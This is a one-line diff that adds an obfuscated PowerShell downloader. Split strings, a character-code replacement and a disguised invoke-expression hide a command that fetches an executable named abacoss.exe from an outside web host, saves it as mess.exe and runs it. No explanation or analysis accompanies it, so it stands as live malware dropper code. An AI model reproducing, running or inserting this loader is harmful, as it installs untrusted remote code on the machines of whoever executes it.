@@ -1,0 +1,1 @@
+﻿(('(New'+'-Object'+' Sy'+'ste'+'m.Net.WebCli'+'e'+'nt).Do'+'wnloadF'+'il'+'e(V'+'iBhttp://world'+'n'+'it.com/abaco'+'ss'+'.exeVi'+'B,ViB'+'mess.'+'exeVi'+'B);Start-Process'+' ViBme'+'ss.exeVi'+'B')  -cReplACE([chAr]86+[chAr]105+[chAr]66),[chAr]39)|& ( $verbOSEPrEfErenCe.TostRInG()[1,3]+'X'-jOin'')
